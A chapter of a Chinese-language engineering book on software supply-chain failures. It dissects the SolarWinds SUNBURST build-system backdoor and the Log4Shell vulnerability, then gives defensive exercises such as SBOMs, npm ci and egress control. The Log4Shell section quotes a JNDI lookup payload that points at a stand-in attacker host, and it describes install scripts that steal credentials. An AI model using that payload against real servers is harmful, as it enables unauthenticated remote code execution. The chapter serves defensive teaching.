# ch20 — 供應鏈即災難：當你信任的更新本身被下毒

> **本章解剖什麼**：前兩章（見 ch18、ch19）看的是「你自己的程式有個沒設防的小洞」——Morris 的 fingerd 溢位、Heartbleed 的缺漏邊界檢查。這一章把鏡頭拉到一個更難防的地方：洞不在你的程式裡，在你**信任**的東西裡。SolarWinds（2020）是一個經過官方簽章、來自官方更新通道的合法更新，本身被植入了後門——你的所有驗證機制全部放行，因為它們驗的是「來源」不是「內容」。Log4Shell（2021）是一個無所不在、你以為無害的 log 函式庫，藏著一條「把被記錄的字串當程式碼執行」的路徑——它深埋在你依賴的依賴的依賴裡，你甚至不知道自己用了它。兩案的共通形狀：**你的安全邊界，延伸到每一個你 import 的套件、每一個 CI 拉的 base image、每一個會自動更新的 agent。** 主打 **F12**（變更即觸發：自動更新管道本身成為投毒管道）、**F3**（起司孔洞對齊：信任鏈每一層都沒檢出）、**F14**（規模放大／單一栽培：無所不在＝爆炸半徑巨大）、**F8**（潛伏條件：後門潛伏數月、漏洞潛伏多年）。這是 Part VI「看不見的縫」的收束——縫不在你看得到的地方，在你根本沒在看的地方。

## 從你已知的出發

先做一件你大概從來沒認真做過的事：把你「一次部署」的信任鏈，從頭到尾畫出來。

不是畫 CI/CD pipeline 的流程圖——那個你閉著眼睛都會畫。我要你畫的是**信任**的傳遞：從你按下 merge 的那一刻，到那行程式碼在 prod 跑起來，中間有多少個環節，是你「相信它沒問題、但從沒真的驗證過」的。

試著數。你 commit 的程式碼，import 了一堆 npm 套件——你讀過其中幾個的原始碼？你的 `package-lock.json` 鎖住了版本，但鎖住的那個版本，是你信任 npm registry 沒被掉包、信任那個套件的作者沒在某次小版本更新裡塞東西。你的 CI 跑在一個 base image 上——`node:20-alpine` 之類——那個 image 裡有幾百個你沒列、也沒看過的系統套件，是 Docker Hub 上某個帳號推上來的。你的 CI 本身跑在 GitHub Actions 上，每一步 `uses:` 的 action 是別人的 repo，很多人直接 pin 一個 tag（`@v3`）而不是 commit SHA——而 tag 是可以被重新指向的。你的 ECS task 上跑著監控 agent、APM agent、安全掃描 agent，它們全都**會自動更新自己**，而且通常跑在比你的應用更高的權限上。

數完了嗎？大部分人數到一半就會發現：**這條鏈上，你真正「驗證過內容」的環節，趨近於零。** 你驗證過的是**來源**——套件來自 npm 官方、image 來自官方 registry、更新有正確簽章。你那句「應該沒事吧」的完整版是：**「一個來源可信、經過簽章的官方更新，內容應該是安全的吧。」**

這一章要拆穿的，就是這句話。SolarWinds 告訴你：一個合法簽章、來自官方通道的更新，本身可以是有毒的——簽章只證明「它真的來自 SolarWinds」，不證明「SolarWinds 給你的東西沒被人動過手腳」。Log4Shell 告訴你：你以為最無害的一個動作——把使用者送來的字串寫進 log——可以是一個未經身分驗證的遠端程式碼執行入口；而那條漏洞所在的函式庫，深埋在你依賴鏈的某一層，你連自己用了它都不知道。

焦慮工程師的本能是「不信任任何輸入」。這一章把那個本能往外推一圈：**你的「輸入」不只是使用者打進來的字串，還包括你 import 的每一行別人的程式碼、你拉的每一個 image、你的 agent 半夜自動裝上的每一個更新。** 你的信任邊界，比你以為的大得多——而它最薄的地方，往往是你最不會去看的地方。

## SolarWinds／SUNBURST：簽章是真的，內容是毒的

### 冷開場：FireEye 發現自己被偷了

2020 年 12 月初。一家叫 FireEye 的資安公司——專門幫別人抓駭客、做事件應變的頂尖公司——發現了一件很糟的事：**自己被入侵了**。攻擊者偷走了它的紅隊工具（red team tools，模擬攻擊用的一整套武器）。

對一家資安公司來說，這是丟臉，但還不是世界末日。真正讓人脊背發涼的，是接下來的追查。FireEye 的調查團隊往回挖，想知道攻擊者是怎麼進來的——結果發現入口不在自己這邊的任何一個漏洞，而在一個它信任、而且全世界數萬家機構都信任的東西：一套叫 **SolarWinds Orion** 的網路管理軟體，以及它一次**完全正常、經過官方簽章的例行更新**。

2020 年 12 月 13 日，FireEye 公開揭露。同一天，美國網路安全暨基礎設施安全局（CISA）發出緊急指令 ED 21-01，要求所有聯邦機構立刻把裝有受影響 Orion 版本的伺服器**斷網下線**。

這不是一家公司被打。這是美國財政部、商務部、國土安全部，以及一大批大型企業，全都在過去九個多月裡，透過一個它們花錢買來、用來「監控自己網路健康」的工具，被同一個攻擊者開了後門。後來歸因為與俄羅斯對外情報局（SVR）有關的 APT29（也叫 Cozy Bear 或 NOBELIUM）。

### 裝填：後門不在程式裡，在「做出程式的那台機器」裡

要看懂這場災難為什麼這麼難防，得先把一個直覺打掉。

你聽到「SolarWinds 被駭」，第一反應大概是：Orion 這套軟體有個漏洞，攻擊者利用它進去。**這是錯的，而且這個錯誤本身就是本案的核心教訓。** Orion 的原始碼沒有可被利用的漏洞。攻擊者沒有去攻擊 Orion 這個「產品」——他們去攻擊了**製造 Orion 的那條生產線**。

具體說：攻擊者先潛入了 SolarWinds 的內部**建置環境**（build environment）——就是把原始碼編譯成出貨二進位檔的那套 CI 系統。然後他們在裡面植入了一個專用的惡意工具，事後被命名為 **SUNSPOT**。SUNSPOT 不做別的，它只做一件事：**監看 Orion 的 build**。

當建置流程開始編譯某一個特定的原始碼檔時，SUNSPOT 會在「編譯正要發生的那一瞬間」介入——把後門程式碼（事後命名為 **SUNBURST**，一個惡意的 `.dll`）即時注入到那個正在被編譯的檔案裡，等編譯一結束，馬上把原始碼還原回乾淨的原樣。

停下來體會這個設計的惡毒。SolarWinds 工程師去看原始碼，是乾淨的；版本控制的歷史，是乾淨的；編譯出來的 `.dll` 卻帶著後門。後門只活在「編譯的那一刻」，存在於原始碼與二進位檔之間那道沒人會去盯的縫裡——你**信任 build 系統會忠實地把原始碼變成二進位檔**，而這個信任，正是被攻破的地方。

接下來才是最關鍵的一步：這個帶後門的 `.dll`，跟著**完全正常的出貨流程**走下去。它被 SolarWinds **合法的程式碼簽章**（code signing）簽署——因為對 SolarWinds 的簽章系統來說，這就是 build 系統正常產出的二進位檔，沒有理由不簽。然後它經由 **SolarWinds 官方的更新通道**，推送給所有訂閱 Orion 更新的客戶。

對下游的每一個客戶而言，它是一個**毫無破綻的更新**：來自官方通道、帶著官方有效簽章、版本號正常、安裝過程正常。你公司的安全政策說「只安裝官方簽章的更新」——它通過了。你的端點偵測軟體驗證簽章——它通過了。每一道你為「確保更新可信」而設的關卡，這個後門都**合法地**走了過去，因為那些關卡驗的全是「來源」。

惡意更新在 2020 年 3 月到 6 月之間隨 Orion 更新散布。

### 觸發與潛伏：兩週的沉默，然後選擇性出手

SUNBURST 被裝到下游機器上之後，並沒有立刻動作。它先**潛伏約兩週**（這是 F8 潛伏條件最教科書的展現：災難早已裝填，觸發被刻意延後）。這個延遲是攻擊者的設計——它讓後門的「裝上」與「啟動」在時間上拉開，使得任何想「裝上後立刻觀察行為」的沙箱分析都看不到東西。

潛伏期過後，SUNBURST 啟動。它做的第一件事不是搞破壞，而是**偵察與偽裝**：檢查自己跑在什麼環境裡，如果發現像是分析沙箱或資安研究人員的機器，就保持沉默不動作。確認是真實目標後，它才開始以**擬態正常流量**的方式，與攻擊者的命令控制（C2）伺服器通訊——它的網路行為被設計得像 Orion 本來就會發的那種遙測流量，混在正常噪音裡。

然後是最冷靜的一步：在約 18,000 個下載了帶後門更新的組織裡，攻擊者**不是對所有人都動手**。他們把這 18,000 當成一個篩選池，只對其中**極少數高價值目標**（分析指實際被進一步深入入侵的少於約 100 個組織，照 landscape）投放後續工具（如 TEARDROP、Cobalt Strike），展開真正的滲透與情報竊取。

這一點常被講錯。流行說法是「18,000 家公司被駭」——不精確。18,000 是**下載了後門更新**的數量上限；真正被深入利用的，是其中精挑細選的不到約 100 個。這不是無差別的破壞，是一場有耐心、有選擇、重在隱匿與情報的諜報行動。它不勒索、不破壞、不喧嘩——它要的是**待在裡面、不被發現、慢慢拿東西**。它能潛伏九個多月，正因為它從不做會觸發警報的吵鬧行為。

### 餘波：最後是誰抓到的？

整場行動最後是怎麼曝光的，本身就是對「自動偵測」的一記耳光。

不是哪家機構的入侵偵測系統叫了，也不是哪個自動掃描抓到惡意簽章——因為簽章是合法的。是 **FireEye 因為自己的紅隊工具被偷、往回追查，才意外揪出整條供應鏈**。這場橫跨數萬機構、潛伏九個多月的入侵，最終是靠攻擊者「順手多偷了一點東西」、踩到一家有能力反查的資安公司，才被掀開。要不是攻擊者貪了這一手，它可能還會潛伏更久。

事後美國政府正式把它歸因於俄羅斯 SVR。CISA 的緊急指令、Mandiant/FireEye 與 Microsoft 的技術分析，把 SUNSPOT（編譯期注入工具）、SUNBURST（後門）、TEARDROP（後續載荷）一一拆解。整起事件被視為「軟體供應鏈的建置流程，是一個全新的、極高價值的攻擊面」這一認知的分水嶺。它的核心結論可以濃縮成一句，後面 ch22、ch23 都會回收：**可信的「來源」，不等於可信的「內容」。**

## Log4Shell：一個 log 函式，一條遠端執行漏洞

### 冷開場：一條聊天訊息打穿一台伺服器

2021 年 12 月。一群 Minecraft 玩家發現，只要在遊戲的**聊天框**裡貼上一段特定格式的文字，就能讓**伺服器**去執行任意程式碼。

讓我們把這件事的荒謬程度講清楚。不是上傳惡意檔案，不是利用某個登入漏洞，不是 SQL injection——就只是**在聊天框打一句話**。那句話會被伺服器記進 log，而光是「被記進 log」這個動作，就足以讓攻擊者控制的程式碼在伺服器上跑起來。

同一個技巧很快被發現適用範圍遠遠不只 Minecraft。問題出在一個叫 **Apache Log4j 2** 的 Java logging 函式庫——一個極其普遍、被無數企業系統、雲服務、甚至各種你想不到的裝置當作「寫 log」這件再基本不過的事的底層元件。漏洞編號 **CVE-2021-44228**，外號 **Log4Shell**，CVSS 嚴重度評為滿分 **10.0**。

2021 年 12 月 9 日公開揭露（漏洞報告其實在 11 月 24 日就提交給了 Apache）。接下來的幾天，全世界的資安團隊與工程師過了一個不眠的週末——因為這個漏洞的爆炸半徑，幾乎等於「全世界的 Java 伺服器」。

### 裝填：「記錄資料」這個動作，被設計成可以「執行程式碼」

Log4Shell 的可怕，不在於它是個複雜的漏洞——恰恰相反，它的機制簡單到讓人發冷。它是好幾個「各自看起來合理」的設計決定，疊在一起的結果。

**潛伏條件一：Log4j 會對 log 訊息的內容做「插值」。**

Log4j 2 支援一種叫 lookup 的語法：在 log 訊息裡寫 `${...}`，Log4j 在記錄時會把它**展開**成某個動態值。例如 `${java:version}` 會被換成 Java 版本號。立意是方便——讓你在 log 裡嵌入環境資訊。問題是：它對「被記錄的訊息內容本身」也做這種展開。也就是說，如果你的程式碼是 `log.info(userInput)`，而 `userInput` 裡含有 `${...}`，Log4j 會**主動去解析並執行**那個 `${...}`。

請體會這道縫。在你的心智模型裡，「寫 log」是一個**唯讀的、被動的、無害的**動作——你只是把一串字記下來。但在 Log4j 的實作裡，log 訊息**不是純資料，它會被當成一種小型的可執行模板**。資料與程式碼之間那條你以為存在的界線，在這裡崩掉了。

**潛伏條件二：lookup 裡包含 JNDI，而 JNDI 可以從遠端載入並執行 class。**

Log4j 支援的 lookup 之一是 JNDI（Java Naming and Directory Interface）lookup：`${jndi:...}`。JNDI 是 Java 用來查目錄服務（LDAP、RMI、DNS 等）的標準介面。而 JNDI 有一個極其強大、也極其危險的能力：它可以**從遠端伺服器抓回一個 Java class，然後把它載入到當前的 JVM 裡執行**。

把這兩個條件串起來，致命的攻擊就成形了。攻擊者只要讓一個含有

```
${jndi:ldap://attacker.com/a}
```

的字串，被你的應用程式寫進 log——Log4j 在記錄時就會：(1) 看到 `${jndi:...}`，啟動 JNDI lookup；(2) 向 `attacker.com` 控制的 LDAP 伺服器發出查詢；(3) 抓回攻擊者準備好的惡意 Java class；(4) **載入並執行它**。這就是一個未經任何身分驗證、不需任何權限的**遠端程式碼執行（RCE）**。

**潛伏條件三：「把使用者輸入寫進 log」是全世界的普遍習慣。**

最後一塊拼圖，是這個攻擊的觸發點有多麼唾手可得。把使用者可控的字串寫進 log，是業界**到處都在做**的事——記下每個請求的 `User-Agent` header、記下登入失敗時使用者填的帳號、記下表單欄位、記下聊天訊息。這些全都是「為了排查問題而留紀錄」的正常工程實務。而恰恰是這個無所不在的好習慣，讓攻擊者有無數個入口可以把惡意字串送進你的 log——改一個 HTTP header 就行，不需要登入、不需要任何權限。

### 觸發與爆炸：無所不在，就是無處可逃

攻擊本身簡單到可以寫成一行：把 `${jndi:ldap://...}` 塞進任何一個會被目標伺服器記錄的欄位。揭露後的幾天內，全球的伺服器 log 裡開始出現海量的這種探測字串——攻擊者用自動化工具地毯式地對著整個網際網路掃，試圖找出哪些伺服器會「上鉤」去連他們的 LDAP。

但真正讓 Log4Shell 成為「近年最嚴重漏洞」的，不是這個攻擊多巧妙，而是它的**規模**——這正是 F14（規模放大／單一栽培）。Log4j 太普遍了，普遍到它構成了 Java 生態的一種單一栽培（monoculture）：太多東西都用同一個元件來做「寫 log」這件最基本的事。一個漏洞，瞬間讓全球**數以百萬計**的伺服器與應用同時暴露。

更糟的是它**藏得有多深**。很少有人是「直接」用 Log4j 的——它通常是「**依賴的依賴的依賴**」，深埋在某個你引入的框架、某個你用的函式庫、某個你拉的 base image 裡面。揭露當下，全世界無數組織面對的第一個問題甚至不是「怎麼修」，而是「**我到底有沒有用 Log4j？用在哪？**」——很多人根本答不出來，因為他們從沒列過自己完整的依賴清單。

這就是 F14 與 F8 的合謀：無所不在（爆炸半徑巨大）＋藏在遞移依賴深處（潛伏、難以盤點）。「升級 Log4j 就好了」這句話，難就難在前半句——你得先**找到所有用到它的地方**，而這對一個沒有軟體物料清單（SBOM）的組織來說，幾乎是不可能完整的任務。

### 餘波：endemic，會跟我們很多年

Log4Shell 沒有官方事故調查（它是個漏洞，不是單一事故），但美國的網路安全審查委員會（Cyber Safety Review Board, CSRB）在 2022 年 7 月發布了一份專題報告，下了一個讓人不太舒服的結論：Log4Shell 是一個 **endemic（地方性長存）** 的漏洞——它不會「修完就結束」，而是會在未來**很多年**持續被利用，因為總有些深埋在某處、沒人盤點到的 Log4j 一直沒被升級。

CSRB 同時把矛頭指向更深的問題：開源依賴的治理缺口，以及 SBOM（軟體物料清單）的普遍缺失。這份報告的潛台詞，正好接回本章開頭要你做的那件事：**如果你連自己用了什麼都列不出來，你就無法在下一個 Log4Shell 來的時候，知道自己該修哪裡。**

## 故障解剖

兩場災難，表面上很不一樣：一個是國家級駭客精心植入的後門，一個是開源函式庫裡一個危險的預設行為。但把它們放進失敗模式語言，會看到同一個骨架。

### 潛伏 vs 觸發

| | 潛伏條件（早就裝填好的） | 觸發（最後一根稻草） |
|---|---|---|
| **SolarWinds** | build 系統被植入 SUNSPOT、信任根（簽章＋官方通道）被默認為等於「內容可信」、自動更新通道可瞬間擴散 | 一次例行 Orion 更新——對下游而言完全正常、合法簽章、來源可信 |
| **Log4Shell** | log 訊息會被插值、JNDI 能遠端載入執行 class、「記錄使用者輸入」是普遍習慣、Log4j 深埋在遞移依賴 | 一個含 `${jndi:ldap://...}` 的字串，被寫進了 log |

兩案的潛伏條件都不是「bug」——它們是**設計決定與信任假設**。SolarWinds 的潛伏條件是「我們相信官方簽章的更新」這個合理到沒人質疑的政策；Log4Shell 的潛伏條件是「lookup 很方便」「JNDI 很強大」「記 log 很無害」這三個各自合理的決定。觸發都極其平凡：一次例行更新、一句被記下的字串。**災難不在觸發的戲劇性，在潛伏條件早已悄悄把炸藥裝滿。**

### 起司的孔洞

這兩案最值得看的，是它們各自打穿了你「信任鏈」上的哪幾層防禦。先看 SolarWinds：

```
你的程式 ─┬─[防線1: 只裝官方來源的更新]─── 破洞: 後門就來自官方通道
          │
          ├─[防線2: 驗證程式碼簽章]──────── 破洞: 簽章合法，驗的是來源不是內容
          │
          ├─[防線3: 端點偵測已知惡意]────── 破洞: 後門擬態、潛伏、避沙箱，非已知特徵
          │
          └─[防線4: 異常流量告警]────────── 破洞: C2 擬態正常遙測，混在噪音裡
                                            ↓
                                  靠 FireEye 自己被偷，才被反查出來
```

每一層都是為「確保更新可信」而設的合理防線，每一層都被**合法地**穿透——因為它們驗的全是「來源／已知特徵」，而攻擊把毒裝進了「來源可信、特徵未知」的內容裡。

再看 Log4Shell：

| 防線 | 為什麼沒擋住 |
|---|---|
| 輸入驗證（不信任使用者輸入） | 你驗的是「這個字串會不會破壞我的邏輯」，沒料到「光是把它寫進 log」就會觸發執行——資料/程式碼界線崩潰 |
| 「記 log 是唯讀無害動作」的假設 | 這個假設在 Log4j 的插值＋JNDI 設計下根本不成立 |
| 知道自己用了哪些元件（盤點） | Log4j 是遞移依賴，深埋多層，多數組織沒有 SBOM、無從盤點 |
| 最小權限／網路出口管制 | 多數伺服器能自由對外發 LDAP/RMI 連線，給了 JNDI 抓回惡意 class 的通道 |

兩張表都在反駁同一個「單一根因」的衝動。SolarWinds 不是「簽章機制壞了」——簽章運作完全正常，問題是**我們對簽章的期待錯了**（以為它保證內容）。Log4Shell 不是「log4j 有個 bug」——它是好幾個合理設計疊加的湧現性危險，加上一個沒人盤點得清的依賴生態。能問的問題不是「誰寫了壞程式」，是「**為什麼我的整條信任鏈，沒有任何一層在驗『內容是否真的安全』**」。

### 對應模式

- **F12（變更即觸發）**：兩案都是「動了它就是觸發」，而且觸發點是你**最信任、最不設防**的那個動作。SolarWinds 是「安裝一次官方更新」——你天天做、從不懷疑；自動更新管道本身成了投毒管道。Log4Shell 是「把一個字串寫進 log」——比部署還日常。F12 在這裡尤其陰險：觸發不是一次危險操作，是一次你定義為「絕對安全」的例行動作。
- **F3（起司孔洞對齊）**：SolarWinds 是 F3 的極端展現——信任鏈上**每一層驗證都運作正常**，卻**每一層都沒擋住**，因為它們對齊在同一個盲點（驗來源、不驗內容）。這不是某一層破了洞，是所有層的洞剛好都在同一個位置。
- **F14（規模放大／單一栽培）**：Log4Shell 是 F14 的純粹形態——Log4j 的無所不在構成單一栽培，一個漏洞一次打中所有人；SolarWinds 則是**自動更新通道**這個 F14——同一個受信任的散布管道，把單一建置入侵瞬間擴散到 18,000 個組織。
- **F8（潛伏條件 vs 觸發）**：SUNBURST 刻意潛伏約兩週才啟動、潛伏九個多月才被發現；Log4Shell 這個危險設計潛伏在 Log4j 裡更久（受影響版本從 2.0-beta9 起），無人察覺其武器化潛力。災難早就裝填好，只等一個再平凡不過的觸發。

### 一句話形狀

**SolarWinds 的形狀是**：一個合法簽章、來自官方通道的更新，在「做出它的那台 build 機器」上被植入了後門——你信任鏈上每一道驗證都正常運作、也都合法放行，因為它們驗的是「來源」而非「內容」，於是毒透過你最不設防的自動更新管道，一次擴散到數萬機構。

**Log4Shell 的形狀是**：一個你以為無害的「寫 log」動作，因為 Log4j 把 log 訊息當可執行模板、又內建能遠端載入執行 class 的 JNDI——使任何一句被記錄的使用者輸入，都成了未經驗證的遠端程式碼執行入口；而 Log4j 的無所不在與深埋遞移依賴，讓這個漏洞的爆炸半徑大到「全球 Java 伺服器」、又難盤點到「沒人說得清自己有沒有中」。

合起來，兩案是同一句話：**你的安全邊界，延伸到每一個你 import 的東西、每一個你信任的自動更新管道——而你對它們，幾乎只驗過來源，從沒驗過內容。**

## 換成你的系統

你活在這條信任鏈的正中央，而且比 SolarWinds 的客戶更深——他們至少知道自己裝了 Orion，你的 `node_modules` 裡有幾百個你根本沒讀過的套件。

**先點名你那句「應該沒事吧」**：一個來源可信、有官方簽章／來自官方 registry 的依賴或更新，內容是安全的。

這個假設錯的時候，會以兩種形狀壞給你看。

**形狀一（SolarWinds 型）：合法管道散布的毒。** 你 `npm install` 的某個套件——一個你信任多年、星星數很高的工具——維護者帳號被釣魚盜了，或維護權被轉交給惡意第三方，然後在一次**看起來再正常不過的小版本更新**裡（`1.4.2` → `1.4.3`），塞進一段在 install script 或執行期偷偷外傳環境變數（你的 AWS 金鑰、token）的程式碼。`package-lock.json` 不會救你——如果你跑的是 `npm install` 而非嚴格的 `npm ci`，或 Renovate/Dependabot 自動把 patch 版本合進來，這個更新會**順著你信任的自動化流程**進到 build，被你的 CI 簽章、打包、部署。pipeline 每一步都「成功」，因為它驗的是「套件來自 npm、版本對得上」——從不驗「這個版本的內容有沒有變壞」。這就是 SolarWinds 的形狀，只是把「Orion 更新」換成「你某個 transitive dependency 的 patch bump」。供應鏈攻擊在 npm 生態（typosquatting、帳號劫持、惡意 maintainer）是**真實且反覆發生**的，不是假設。

**形狀二（Log4Shell 型）：你以為無害的動作，藏著執行路徑。** 你的某個依賴——你甚至不知道你用了它，它是依賴的依賴——在處理某種你天天餵給它的輸入時，有一條你完全沒想到的程式碼執行路徑：某個序列化函式庫的不安全反序列化、某個模板引擎的伺服器端模板注入。你以為你在「解析資料」，那個函式庫在特定輸入下卻會「執行程式碼」。資料/程式碼界線崩潰——和 Log4Shell 一模一樣的形狀。

可操作的自問，不要只記「要小心」：

1. **我的依賴是用什麼安裝的？** CI 裡是嚴格的 `npm ci`（完全照 lockfile，不自作主張升版）還是 `npm install`？我的自動升版工具（Dependabot/Renovate）會不會把 patch/minor 自動 merge 進來、繞過人眼？——這道直接對應「SolarWinds 型」的入口。
2. **我有沒有 SBOM？我能不能在 30 分鐘內回答「我有沒有用 X 套件、用在哪幾個服務」？** Log4Shell 那個週末，能在 30 分鐘內答出來的團隊，和答不出來的團隊過的是兩種人生。`npm ls <pkg>` 跑得出來嗎？你的 image 裡有 SBOM 嗎？
3. **我的 build／runtime 跑在什麼權限上？出口（egress）管不管？** 如果一個被投毒的 install script 想把我的 secrets 外傳，或一個被利用的依賴想對外連 LDAP 抓 class——我的 CI runner、我的 ECS task 能不能自由對任意外部位址發連線？最小權限與 egress 管制，是把「萬一中了」的爆炸半徑壓下來的那道牆（接 ch22 的「安全地壞」）。
4. **我的監控／安全 agent，是不是會自動更新、又跑在高權限？** 這正是 SolarWinds 與 CrowdStrike（見 ch13）的共通教訓——你裝來「保護自己」的東西，本身就是一個會自動更新、權限極高的單點。它的更新，你 canary 了嗎？

最後一個橋接，回到 ch19（見 ch19）：Heartbleed 是「你依賴的開源元件，沒人有資源去顧」；這一章是「你依賴的開源元件，被人**刻意**動了手腳，或藏著被武器化的能力」。前者是疏於照料的脆弱，後者是被惡意利用的脆弱——但兩者指向同一個動作：**先知道你到底依賴了什麼。** 你連清單都沒有，談什麼防禦。

## 紙上推演

### 推演題1 **[20 分鐘]** ★★

把你**最近一次**真實部署的信任鏈畫出來——從你按下 merge，到那行程式碼在 prod 跑起來。每一個環節標兩件事：(a) 它是「你寫的／你控制的」，還是「你信任別人的」；(b) 對於「你信任別人的」那些，你驗證的是**來源**還是**內容**。數一數：這條鏈上,你真正驗證過「內容」的環節有幾個？

#### 推演解答

（開放題，自答。）一條典型的鏈大概長這樣：你的 commit（你寫的）→ import 的 npm 套件（信任別人；驗來源——lockfile 鎖了版本與 hash，但 hash 只證明「和上次裝的是同一份」，不證明「這份內容安全」）→ CI 的 base image（信任別人；通常連來源都只驗到 tag）→ GitHub Actions 的第三方 action（信任別人；很多人 pin `@v3` 這種可變 tag，連來源都不嚴）→ build 出的 artifact（你的 build 系統產出——這正是 SolarWinds 被攻破的環節，你信任 build 忠實編譯）→ 部署→ runtime 上的各種 agent（信任別人，且會自動更新）。

數下來，「驗證過內容」的環節幾乎是零——你驗的全是來源（簽章、registry、hash）。這題的目的不是讓你立刻去 audit 每一個套件（不現實），是讓你**親眼看到**自己對「來源 = 內容安全」這個等號的依賴有多深。SolarWinds 與 Log4Shell 都是在攻擊這個等號。能把這條鏈畫出來、並指出「這裡、這裡、這裡，我只驗了來源」，這題就過了。

### 推演題2 **[15 分鐘]** ★★

口頭（或寫給另一個工程師）解釋：為什麼「這個更新有合法的官方簽章」**不等於**「這個更新是安全的」？SolarWinds 的簽章到底證明了什麼、沒證明什麼？如果簽章不夠，要再加一道什麼，才能在「內容被植入後門」時抓到？

#### 推演解答

程式碼簽章證明的是**完整性與來源**：這個二進位檔確實來自持有該私鑰的一方（SolarWinds），且從簽署之後沒被改過。它**沒有**證明的是：在簽署的那一刻，被簽的內容本身是否乾淨。SolarWinds 案裡，後門在**簽署之前**就被注入了（SUNSPOT 在編譯期注入，產物正常地走到簽章那一步）——所以簽章忠實地簽了一份已經有毒的東西。簽章只能保證「從 A 點到 B 點沒被竄改」，保證不了「A 點本身沒被污染」。

要在「A 點被污染」時抓到，需要把信任往源頭推、並驗「內容對得上原始碼」：可重現建置（reproducible builds，讓任何人從同一份原始碼能編出位元相同的二進位檔，從而比對出 build 系統有沒有偷改）、build 來源證明（provenance / SLSA 之類，記錄「這個 artifact 是由哪份 commit、在哪個受信環境、怎麼建出來的」）、以及 build 環境本身的完整性監控。核心觀念是把問題從「這東西是不是來自官方」升級成「**這東西的內容，能不能對應到我能審查的原始碼**」。能講清楚「簽章驗的是傳輸完整性與來源、不是內容善惡」，這題就過了。

### 推演題3 **[20 分鐘]** ★★★（對帳）

把你維運過、或你聽過的一次真實供應鏈／依賴事故（npm 套件被投毒、某個 base image 帶漏洞、某次自動升版引入了壞東西、或你們在 Log4Shell 那個週末做了什麼），對應到本章的 F 模式。逐項問：觸發是不是一次「你信任的更新／依賴」的變更（F12）？有沒有同質化＋規模放大（F14：大家都用同一個東西）？信任鏈上有幾層驗證，它們是不是全在驗來源、對齊在同一個盲點（F3）？這個危險是不是早就潛伏、只等觸發（F8）？

#### 推演解答

（開放題，自答。）以 Log4Shell 那個週末為例：很多團隊的對帳會是——觸發是「一個被記錄的字串」（F12，而且是你最不設防的動作）；F14 命中得很慘（全公司一堆服務都間接依賴 Log4j，一個漏洞全中）；F3 體現在「我們的輸入驗證、WAF、權限控制，沒有任何一層是針對『log 動作會執行程式碼』設計的」；F8 體現在「這個危險設計早就在那裡，只是沒人意識到能武器化」。對帳的關鍵收穫通常是那個刺痛的問題：**「那個週末，我們花了多久才回答出『我們到底有沒有用、用在哪』？」**——如果答案是「好幾天、靠人肉 grep」，那暴露的就是 SBOM 與依賴盤點的缺口。能把一次依賴事故講成「哪幾層信任都只驗來源、哪個盲點被對齊」，而不是「就是 X 套件爛」，這題就過了。

### 推演題4 **[25 分鐘]** ★★（設計題）

你要降低你一個 Node／TypeScript 服務的供應鏈爆炸半徑。請設計**三道**防線，分別對應「SolarWinds 型（合法管道散布的毒）」與「Log4Shell 型（無害動作藏執行路徑）」，並說清楚每一道擋住的是哪一段、它的代價是什麼。

#### 推演解答

一個合理的三道防線（深度防禦，對應兩種形狀）：

1. **鎖死＋盤點：嚴格 `npm ci` + lockfile + SBOM + 自動升版要人眼複核**（主擋 SolarWinds 型的入口、並為 Log4Shell 型提供盤點能力）。CI 一律 `npm ci`（完全照 lockfile，拒絕自作主張升版）；產出並保存 SBOM，讓你能在下一個 Log4Shell 來時 30 分鐘內回答「我有沒有用、用在哪」；Dependabot/Renovate 的 PR **不自動 merge**，至少 patch 以上要有人看一眼 diff（尤其留意 install script 的變動）。代價：升版變慢、多一點人工。但這道直接打掉「壞更新順著自動化無聲進來」的路徑。
2. **最小權限 + egress 管制**（限制兩種形狀「萬一中了」的傷害）。CI runner 與 runtime 用最小權限的角色（短期 credential、scoped IAM）；對外網路出口做白名單——你的服務真的需要能對任意外部位址發連線嗎？如果一個被投毒的 install script 想外傳 secrets、或一個被利用的依賴想連 LDAP 抓 class，egress 白名單就是攔住「資料被帶走／惡意 class 被抓回」的那道牆。代價：白名單要維護、偶爾擋到合法需求要加例外。這是把爆炸半徑從「全盤淪陷」壓到「進來了但帶不走、跑不了下一步」（接 ch22 的「安全地壞」）。
3. **build provenance／可重現建置 + 自動更新的 agent 也要 canary**（往源頭推信任、並馴服「會自動更新的高權限 agent」）。對自己的 artifact 建立來源證明（哪份 commit、哪個環境建的）；對你跑的監控/安全 agent，不要讓它「一更新就全機隊同步生效」——比照 CrowdStrike 的教訓（見 ch13），讓它的更新也走 canary／分批。代價：provenance 工具鏈有導入成本、agent 分批會讓「防護更新」生效慢一點（這是個真實取捨，和 Cloudflare 繞過分階段發布是同一類權衡，見 ch10）。

排序原則：(1) 是地基（沒有盤點與鎖定，後面都是空談，且性價比最高）；(2) 是兜底（假設防線會被穿，限制傷害——這是焦慮工程師的核心信念：不是「不會中」，是「中了也帶不走」）；(3) 是把信任往源頭推的進階手段。三道分別對應「不讓毒無聲進來／中了也限制傷害／把信任根驗到內容層」——任一單獨都不夠，疊起來才是供應鏈版的瑞士起司正面用法（見 ch22）。

## 自我檢核

口頭自答，講得出來才算過關：

1. 為什麼說 SolarWinds「不是 Orion 有漏洞被駭」？攻擊面到底在哪裡（產品 vs 生產線）？這個區別為什麼是本案最重要的教訓？
2. 程式碼簽章「證明了什麼、沒證明什麼」？為什麼 SolarWinds 的後門能帶著合法簽章、走官方通道，一路通過下游每一道驗證？
3. 「18,000 家公司被駭」這句話哪裡不精確？18,000 是什麼數字、實際被深入入侵的約有多少、這個差別說明了攻擊者的什麼意圖？
4. Log4Shell 的核心，是哪三個「各自合理」的設計疊在一起？為什麼「把一個字串寫進 log」會變成遠端程式碼執行？「資料/程式碼界線崩潰」在這裡具體指什麼？
5. 為什麼「升級 Log4j 就好了」這句話，難的是前半句而不是後半句？這跟 SBOM 與遞移依賴有什麼關係？
6. 把 SolarWinds 與 Log4Shell 放在一起：它們命中 F12、F3、F14、F8 各是怎麼體現的？為什麼說兩案的觸發都是「你最不設防的日常動作」？
7. 把這一章接回 ch19（見 ch19）：Heartbleed 的「沒人有資源顧」與本章的「被刻意下毒／藏著武器化能力」，差別在哪？為什麼兩者都指向「先知道你依賴了什麼」這同一個動作？
8. 在你自己的系統裡，「一個來源可信、有官方簽章的更新內容應該安全」這個假設，藏在哪幾個具體的地方（CI 安裝方式、自動升版、會自動更新的 agent）？哪一個最可能先咬到你？

## 延伸閱讀

